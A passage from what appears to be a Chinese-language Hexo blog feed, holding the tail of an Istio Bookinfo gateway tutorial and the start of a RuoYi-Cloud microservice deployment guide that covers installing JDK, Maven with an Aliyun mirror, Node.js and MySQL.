src="https://gitee.com/ljh00928/csdn/raw/master/img/b187b91fd8e7492a9e8cb0038f93dfe1.png" alt="img"></p><h3 id="创建Gateway"><a href="#创建Gateway" class="headerlink" title="创建Gateway"></a>创建Gateway</h3><p>大家可以先看下案例中Gateway和VirtualService是怎么写的</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@master231</span> <span class="hljs-string">istio-1.17.3</span>]<span class="hljs-comment"># cat samples/bookinfo/networking/bookinfo-gateway.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.istio.io/v1alpha3</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Gateway</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">bookinfo-gateway</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">istio:</span> <span class="hljs-string">ingressgateway</span> <span class="hljs-comment"># use istio default controller</span><br>  <span class="hljs-attr">servers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span><br>      <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">http</span><br>      <span class="hljs-attr">protocol:</span> <span class="hljs-string">HTTP</span><br>    <span class="hljs-attr">hosts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;*&quot;</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.istio.io/v1alpha3</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">VirtualService</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">bookinfo</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">hosts:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;*&quot;</span><br>  <span class="hljs-attr">gateways:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">bookinfo-gateway</span><br>  <span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">uri:</span><br>        <span class="hljs-attr">exact:</span> <span class="hljs-string">/productpage</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">uri:</span><br>        <span class="hljs-attr">prefix:</span> <span class="hljs-string">/static</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">uri:</span><br>        <span class="hljs-attr">exact:</span> <span class="hljs-string">/login</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">uri:</span><br>        <span class="hljs-attr">exact:</span> <span class="hljs-string">/logout</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">uri:</span><br>        <span class="hljs-attr">prefix:</span> <span class="hljs-string">/api/v1/products</span><br>    <span class="hljs-attr">route:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">destination:</span><br>        <span class="hljs-attr">host:</span> <span class="hljs-string">productpage</span><br>        <span class="hljs-attr">port:</span><br>          <span class="hljs-attr">number:</span> <span class="hljs-number">9080</span><br></code></pre></td></tr></table></figure><p>Istio Ingress Gateway，并与应用程序关联</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio-1.17.3]# kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml <br>gateway.networking.istio.io/bookinfo-gateway created<br>virtualservice.networking.istio.io/bookinfo created<br></code></pre></td></tr></table></figure><p>查看网关</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@master231</span> istio<span class="hljs-number">-1.17</span><span class="hljs-number">.3</span>]<span class="hljs-meta"># kubectl get gw</span><br>NAME               AGE<br>bookinfo-gateway   <span class="hljs-number">26</span>s<br><br></code></pre></td></tr></table></figure><p>根据文档设置访问网关的 INGRESS_HOST 和 INGRESS_PORT 变量。确认并设置。 在Istio 的安装文档中，我已经通过NodePort 方式来暴露istio-ingressgateway 服务，现在根据如下命令来获取</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">INGRESS_PORT</span>=$(kubectl -n istio-system <span class="hljs-built_in">get</span><span class="hljs-built_in"> service </span>istio-ingressgateway -o <span class="hljs-attribute">jsonpath</span>=<span class="hljs-string">&#x27;&#123;.spec.ports[?(@.name==&quot;http2&quot;)].nodePort&#125;&#x27;</span>)<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">SECURE_INGRESS_PORT</span>=$(kubectl -n istio-system <span class="hljs-built_in">get</span><span class="hljs-built_in"> service </span>istio-ingressgateway -o <span class="hljs-attribute">jsonpath</span>=<span class="hljs-string">&#x27;&#123;.spec.ports[?(@.name==&quot;https&quot;)].nodePort&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>获取 ingress IP 地址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">INGRESS_HOST</span>=$(kubectl <span class="hljs-built_in">get</span> po -l <span class="hljs-attribute">istio</span>=ingressgateway -n istio-system -o <span class="hljs-string">&#x27;jsonpath=&#123;.items[0].status.hostIP&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>设置并获取GATEWAY_URL：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">INGRESS_HOST</span>=$(kubectl <span class="hljs-built_in">get</span> po -l <span class="hljs-attribute">istio</span>=ingressgateway -n istio-system -o <span class="hljs-string">&#x27;jsonpath=&#123;.items[0].status.hostIP&#125;&#x27;</span>)<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GATEWAY_URL</span>=<span class="hljs-variable">$INGRESS_HOST</span>:$INGRESS_PORT<br><br>[root@master231 istio-1.17.3]# echo <span class="hljs-variable">$GATEWAY_URL</span><br>10.0.0.232:31977<br></code></pre></td></tr></table></figure><p>访问</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.0.0.232:31977/productpage</span><br></code></pre></td></tr></table></figure><p>每次请求都会打到不同的reviews。大家可以刷新测试</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b7bd621ba52346e592b646eb9b9df3d7.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>istio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>istio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RuoYi-Cloud微服务项目部署</title>
    <link href="/2025/04/18/RuoYi-Cloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/"/>
    <url>/2025/04/18/RuoYi-Cloud%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想来第一次与微服务结缘是在我的第一个 Springboot项目，我接触到了 Nacos 和 Gateway，从那时起，便对微服务产生了浓厚的兴趣，微服务的架构设计、服务拆分、服务治理等内容确实很有意思。这也是我们从事运维的原因之一。自己工作一段时间后，我想着是时候输出一些内容了，把微服务以更加通俗易懂的部署起来。这里先带大家简单的单机部署简单了解下，实际工作中，面临网关，注册中心，调度中心，数据同步选型等。其实部署到k8s中也是一样的，只是将服务容器化，使用k8s编排。如果大家感兴趣，点赞关注就是对我最大的支持。后期我会写一篇关于k8s部署Spring Cloud并结合jenkins，gitlab，harbor等做cicd流水线集成。</p><h1 id="一、框架介绍"><a href="#一、框架介绍" class="headerlink" title="一、框架介绍"></a>一、框架介绍</h1><p>RuoYi-Cloud是一款基于Spring Boot、Spring Cloud &amp; Alibaba、Vue、Element的前后端分离微服务极速后台开发框架。内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、代码生成等。在线定时任务配置；支持集群，支持多数据源。</p><p>RuoYi-Cloud 是通过Java开发，基于微服务架构设计的权限管理系统。</p><p>文档地址：<a href="http://doc.ruoyi.vip/ruoyi-cloud/">http://doc.ruoyi.vip/ruoyi-cloud/</a></p><p>代码下载：<a href="https://gitee.com/y_project/RuoYi-Cloud">https://gitee.com/y_project/RuoYi-Cloud</a> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Java程序开发框架介绍：<br>● Spring：是一个开源的Java开发框架，用于简化Java程序的开发。 <br>● Spring Boot：是基于Spring的全新框架，对比于Spring框架更加的简洁高效。<br>● Spring Cloud：是一套微服务开发框架。<br>● Spring Cloud Alibaba：是阿里巴巴推出的微服务开发框架。<br></code></pre></td></tr></table></figure><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">架构图RuoYi-Cloud-Processon (opens new window)分享地址。<br>https://www.processon.com/view/5ec290195653bb6f2a18504e<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/dacd9b75d911fe2aed60fe2f0fcd8bdd.png" alt="img"></p><h2 id="系统模块"><a href="#系统模块" class="headerlink" title="系统模块"></a>系统模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">com.ruoyi     <br>├── ruoyi-ui              // 前端框架 [80]<br>├── ruoyi-gateway         // 网关模块 [8080]<br>├── ruoyi-auth            // 认证中心 [9200]<br>├── ruoyi-api             // 接口模块<br>│       └── ruoyi-api-system                          // 系统接口<br>├── ruoyi-common          // 通用模块<br>│       └── ruoyi-common-core                         // 核心模块<br>│       └── ruoyi-common-datascope                    // 权限范围<br>│       └── ruoyi-common-datasource                   // 多数据源<br>│       └── ruoyi-common-log                          // 日志记录<br>│       └── ruoyi-common-redis                        // 缓存服务<br>│       └── ruoyi-common-seata                        // 分布式事务<br>│       └── ruoyi-common-security                     // 安全模块<br>│       └── ruoyi-common-sensitive                    // 数据脱敏<br>│       └── ruoyi-common-swagger                      // 系统接口<br>├── ruoyi-modules         // 业务模块<br>│       └── ruoyi-system                              // 系统模块 [9201]<br>│       └── ruoyi-gen                                 // 代码生成 [9202]<br>│       └── ruoyi-job                                 // 定时任务 [9203]<br>│       └── ruoyi-file                                // 文件服务 [9300]<br>├── ruoyi-visual          // 图形化管理模块<br>│       └── ruoyi-visual-monitor                      // 监控中心 [9100]<br>├──pom.xml                // 公共依赖<br></code></pre></td></tr></table></figure><h2 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h2><ul><li>完全响应式布局（支持电脑、平板、手机等所有主流设备）</li><li>强大的一键生成功能（包括控制器、模型、视图、菜单等）</li><li>支持多数据源，简单配置即可实现切换。</li><li>支持按钮及数据权限，可自定义部门数据权限。</li><li>对常用js插件进行二次封装，使js代码变得简洁，更加易维护</li><li>完善的XSS防范及脚本过滤，彻底杜绝XSS攻击</li><li>Maven多项目依赖，模块及插件分项目，尽量松耦合，方便模块升级、增减模块。</li><li>国际化支持，服务端及客户端支持</li><li>完善的日志记录体系简单注解即可实现</li></ul><h2 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h2><p><strong>1、系统环境</strong></p><ul><li>Java EE 8</li><li>Servlet 3.0</li><li>Apache Maven 3</li></ul><p><strong>2、主框架</strong></p><ul><li>Spring Boot 2.3.x</li><li>Spring Cloud Hoxton.SR9</li><li>Spring Framework 5.2.x</li><li>Spring Security 5.2.x</li></ul><p><strong>3、持久层</strong></p><ul><li>Apache MyBatis 3.5.x</li><li>Hibernate Validation 6.0.x</li><li>Alibaba Druid 1.2.x</li></ul><p><strong>4、视图层</strong></p><ul><li>Vue 2.6.x</li><li>Axios 0.21.0</li><li>Element 2.14.x</li></ul><h2 id="内置功能"><a href="#内置功能" class="headerlink" title="内置功能"></a>内置功能</h2><ul><li>用户管理：用户是系统操作者，该功能主要完成系统用户配置。</li><li>部门管理：配置系统组织机构（公司、部门、小组），树结构展现支持数据权限。</li><li>岗位管理：配置系统用户所属担任职务。</li><li>菜单管理：配置系统菜单，操作权限，按钮权限标识等。</li><li>角色管理：角色菜单权限分配、设置角色按机构进行数据范围权限划分。</li><li>字典管理：对系统中经常使用的一些较为固定的数据进行维护。</li><li>参数管理：对系统动态配置常用参数。</li><li>通知公告：系统通知公告信息发布维护。</li><li>操作日志：系统正常操作日志记录和查询；系统异常信息日志记录和查询。</li><li>登录日志：系统登录日志记录查询包含登录异常。</li><li>在线用户：当前系统中活跃用户状态监控。</li><li>定时任务：在线（添加、修改、删除)任务调度包含执行结果日志。</li><li>代码生成：前后端代码的生成（java、html、xml、sql)支持CRUD下载 。</li><li>系统接口：根据业务代码自动生成相关的api接口文档。</li><li>服务监控：监视当前系统CPU、内存、磁盘、堆栈等相关信息。</li><li>在线构建器：拖动表单元素生成相应的HTML代码。</li><li>连接池监视：监视当期系统数据库连接池状态，可进行分析SQL找出系统性能瓶颈。</li></ul><h1 id="二、准备代码"><a href="#二、准备代码" class="headerlink" title="二、准备代码"></a>二、准备代码</h1><p>gitee地址：<a href="https://gitee.com/y_project/RuoYi-Cloud">https://gitee.com/y_project/RuoYi-Cloud</a></p><p>下载代码<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3fba7c3cb6034bc18cc2fdae4b3ce194.png" alt="在这里插入图片描述"></p><p>创建代码存放目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# <span class="hljs-built_in">mkdir</span> RuoYi-Cloud<br><br>[root@node1.local ~]# <span class="hljs-built_in">cd</span> RuoYi-Cloud/<br><br>解压zip包<br>[root@node1.local RuoYi-Cloud]# unzip RuoYi-Cloud-master.zip<br></code></pre></td></tr></table></figure><p>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud]# <span class="hljs-built_in">cd</span> RuoYi-Cloud-master/<br>[root@node1.local RuoYi-Cloud-master]# ll<br>total 88<br>drwxr-xr-x 13 root root  4096 Jan  7 10:55 ./<br>drwxr-xr-x  3 root root  4096 Feb 10 14:12 ../<br>drwxr-xr-x  2 root root  4096 Jan  7 10:55 bin/<br>drwxr-xr-x  7 root root  4096 Jan  7 10:55 docker/<br>drwxr-xr-x  2 root root  4096 Jan  7 10:55 .github/<br>-rw-r--r--  1 root root   698 Jan  7 10:55 .gitignore<br>-rw-r--r--  1 root root  1063 Jan  7 10:55 LICENSE<br>-rw-r--r--  1 root root 12420 Jan  7 10:55 pom.xml<br>-rw-r--r--  1 root root  9220 Jan  7 10:55 README.md<br>drwxr-xr-x  3 root root  4096 Jan  7 10:55 ruoyi-api/<br>drwxr-xr-x  3 root root  4096 Jan  7 10:55 ruoyi-auth/<br>drwxr-xr-x 11 root root  4096 Jan  7 10:55 ruoyi-common/<br>drwxr-xr-x  3 root root  4096 Jan  7 10:55 ruoyi-gateway/<br>drwxr-xr-x  6 root root  4096 Jan  7 10:55 ruoyi-modules/<br>drwxr-xr-x  6 root root  4096 Jan  7 10:55 ruoyi-ui/<br>drwxr-xr-x  3 root root  4096 Jan  7 10:55 ruoyi-visual/<br>drwxr-xr-x  2 root root  4096 Jan  7 10:55 sql/<br></code></pre></td></tr></table></figure><h1 id="三、环境部署"><a href="#三、环境部署" class="headerlink" title="三、环境部署"></a>三、环境部署</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">JDK &gt;= 1.8 (推荐1.8版本)<br>Mysql &gt;= 5.7.0 (推荐5.7版本)<br>Redis &gt;= 3.0<br>Maven &gt;= 3.0<br>Node &gt;= 12<br>nacos &gt;= 2.0.4 (ruoyi-cloud &lt; 3.0 需要下载nacos &gt;= 1.4.x版本)<br>sentinel &gt;= 1.6.0<br></code></pre></td></tr></table></figure><p>查看jdk对应maven版本链接：<a href="http://maven.apache.org/docs/history.html">http://maven.apache.org/docs/history.html</a></p><h2 id="安装jdk"><a href="#安装jdk" class="headerlink" title="安装jdk"></a>安装jdk</h2><p>官网地址：<a href="https://www.oracle.com/java/technologies/downloads/#java8">https://www.oracle.com/java/technologies/downloads/#java8</a></p><p>查看系统架构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# <span class="hljs-built_in">uname</span> -m<br>x86_64<br><br></code></pre></td></tr></table></figure><p>下载jdk<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8f2f6c1dc2564f79a48fefe0e082ee3f.png" alt="在这里插入图片描述"></p><p>创建jdk存放目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local jdk]# <span class="hljs-built_in">mkdir</span> /usr/local/src/jdk<br><br>[root@node1.local jdk]# ll<br>total 144896<br>drwxr-xr-x 2 root root      4096 Feb 10 13:11 ./<br>drwxr-xr-x 4 root root      4096 Feb 10 11:44 ../<br>-rw-r--r-- 1 root root 148362647 Nov 18 22:08 jdk-8u431-linux-x64.tar.gz<br><br>解压tar包<br>[root@node1.local jdk]# tar xf jdk-8u431-linux-x64.tar.gz <br><br>[root@node1.local jdk1.8.0_431]# <span class="hljs-built_in">pwd</span><br>/usr/local/src/jdk/jdk1.8.0_431<br><br></code></pre></td></tr></table></figure><p>配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# vim .bashrc<br><span class="hljs-built_in">export</span> JAVA_HOME=/usr/local/src/jdk/jdk1.8.0_441<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br><br>[root@node1.local ~]# <span class="hljs-built_in">source</span> .bashrc<br><br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# java -version<br>java version <span class="hljs-string">&quot;1.8.0_431&quot;</span><br>Java(TM) SE Runtime Environment (build 1.8.0_431-b10)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.431-b10, mixed mode)<br><br></code></pre></td></tr></table></figure><h2 id="安装maven"><a href="#安装maven" class="headerlink" title="安装maven"></a>安装maven</h2><p>官方地址：<a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a></p><p>创建maven存放目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local maven]# <span class="hljs-built_in">mkdir</span> /usr/local/src/maven<br><br>解压tar包<br>[root@node1.local maven]# tar xf apache-maven-3.9.9-bin.tar.gz<br></code></pre></td></tr></table></figure><p>配置maven仓库，设置阿里镜像仓库，一定要配置一下，国内的下载jar快些，首先进入cd apache-maven-3.6.3目录，创建仓库存储目录ck</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local maven]# <span class="hljs-built_in">cd</span> apache-maven-3.9.9/<br><br>创建仓库存储目录ck<br>[root@node1.local apache-maven-3.9.9]# <span class="hljs-built_in">mkdir</span> ck<br>[root@node1.local apache-maven-3.9.9]# ll<br>total 60<br>drwxr-xr-x 7 root root  4096 Feb 10 11:26 ./<br>drwxr-xr-x 3 root root  4096 Feb 10 11:25 ../<br>drwxr-xr-x 2 root root  4096 Feb 10 11:25 bin/<br>drwxr-xr-x 2 root root  4096 Feb 10 11:25 boot/<br>drwxr-xr-x 2 root root  4096 Feb 10 11:26 ck/<br>drwxr-xr-x 3 root root  4096 Feb 10 11:32 conf/<br>drwxr-xr-x 4 root root  4096 Feb 10 11:25 lib/<br>-rw-r--r-- 1 root root 18920 Aug 14 16:48 LICENSE<br>-rw-r--r-- 1 root root  5034 Aug 14 16:48 NOTICE<br>-rw-r--r-- 1 root root  1279 Aug 14 16:48 README.txt<br><br></code></pre></td></tr></table></figure><p>进入cd conf目录，编辑 vi settings.xml文件，找到·localRepository下面复制一行加上<localRepository>&#x2F;usr&#x2F;local&#x2F;apache-maven-3.6.3&#x2F;ck</localRepository>， 在找到mirror 加上阿里的仓库配置，配置完成报错退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local apache-maven-3.9.9]# <span class="hljs-built_in">cd</span> conf/<br>[root@node1.local conf]# ll<br>total 28<br>drwxr-xr-x 3 root root  4096 Feb 10 11:32 ./<br>drwxr-xr-x 7 root root  4096 Feb 10 11:26 ../<br>drwxr-xr-x 2 root root  4096 Aug 14 16:48 logging/<br>-rw-r--r-- 1 root root 10473 Feb 10 11:32 settings.xml<br>-rw-r--r-- 1 root root  3645 Aug 14 16:48 toolchains.xml<br><br>[root@node1.local conf]# vim settings.xml <br>....<br><span class="hljs-comment">#配置仓库存储目录位置</span><br>&lt;localRepository&gt;/usr/local/src/maven/apache-maven-3.9.9/ck&lt;/localRepository&gt;<br>....<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/990e8fa0a25f4b05a457c35dd225f80d.png" alt="在这里插入图片描述"></p><p>阿里的仓库配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local conf]# vim settings.xml <br>....<br>&lt;mirror&gt;<br>      &lt;<span class="hljs-built_in">id</span>&gt;alimaven&lt;/id&gt;<br>      &lt;name&gt;aliyun maven&lt;/name&gt;<br>       &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;<br>      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;<br>&lt;/mirror&gt;<br>....<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ec49860c01884246889c8eb43037745e.png" alt="在这里插入图片描述"></p><p>配置maven环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# vim .bashrc<br><span class="hljs-built_in">export</span> MAVEN_HOME=/usr/local/src/maven/apache-maven-3.9.9<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$MAVEN_HOME</span>/bin<br><br>[root@node1.local ~]# <span class="hljs-built_in">source</span> .bashrc<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# mvn -v<br>Apache Maven 3.9.9 (8e8579a9e76f7d015ee5ec7bfcdc97d260186937)<br>Maven home: /usr/local/src/maven/apache-maven-3.9.9<br>Java version: 1.8.0_431, vendor: Oracle Corporation, runtime: /usr/local/src/jdk/jdk1.8.0_431/jre<br>Default locale: en_US, platform encoding: UTF-8<br>OS name: <span class="hljs-string">&quot;linux&quot;</span>, version: <span class="hljs-string">&quot;6.8.0-52-generic&quot;</span>, <span class="hljs-built_in">arch</span>: <span class="hljs-string">&quot;amd64&quot;</span>, family: <span class="hljs-string">&quot;unix&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# apt install npm<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local RuoYi-Cloud-master]# node -v<br>v18.19.1<br>[root@node1.local RuoYi-Cloud-master]# npm -v<br>9.2.0<br></code></pre></td></tr></table></figure><h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# apt install mysql-server<br><br>[root@node1.local ~]# mysql -V<br>mysql  Ver 8.0.41-0ubuntu0.24.04.1 <span class="hljs-keyword">for</span> Linux on x86_64 ((Ubuntu))<br></code></pre></td></tr></table></figure><p>加入开机自启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local apt]# systemctl <span class="hljs-built_in">enable</span> mysql.service<br>Synchronizing state of 